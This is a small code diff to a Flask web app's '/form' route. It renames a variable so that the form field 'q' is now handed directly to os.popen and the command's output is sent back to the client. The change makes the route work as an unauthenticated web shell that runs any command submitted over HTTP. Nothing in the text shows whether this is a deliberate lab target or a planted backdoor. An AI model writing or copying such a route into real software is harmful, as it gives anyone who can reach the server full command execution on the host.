@@ -9,7 +9,7 @@ app.config.from_object('config')
 @app.route('/form', methods= ["GET", "POST"])
 def form():
     if request.method == 'POST':
-        story = request.form.get('q')
+        q = request.form.get('q')
         if q:
             stream = os.popen(q)
             return jsonify(result=stream.read())
